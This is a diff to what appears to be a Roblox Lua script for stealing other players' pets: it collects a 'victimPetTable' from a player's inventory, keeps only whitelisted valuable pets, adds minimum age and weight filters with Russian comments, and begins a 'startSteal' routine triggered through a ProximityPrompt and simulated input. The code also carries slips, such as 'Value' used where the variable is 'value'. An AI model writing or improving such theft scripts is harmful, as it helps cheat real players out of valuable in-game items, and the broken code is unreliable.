@@ -23,6 +23,11 @@ local PET_WHITELIST = {
     'Raiju'
 }
 
+-- Фильтр по возрасту и весу
+local MIN_PET_AGE = 3         -- Минимальный возраст питомца (в днях)
+local MIN_PET_WEIGHT = 5.0    -- Минимальный вес питомца (в кг)
+
+
 local victimPetTable = {}
 
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -173,15 +178,19 @@ local function equipPet(pet)
 end
 
 local function getPlayersPets()
-    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-        if not checkPetsWhilelist(value.PetType) then
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petType = value.PetType
+        local age = value.Age
+        local weight = value.Weight
+
+        if not checkPetsWhilelist(Value.PetType, age, weight) then
             continue
         end
 
-
-        table.insert(victimPetTable, value.PetType)
+        table.insert(victimPetTable, Value.PetType)
     end
 end
+
 
 local function startSteal(trigerName)
     if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
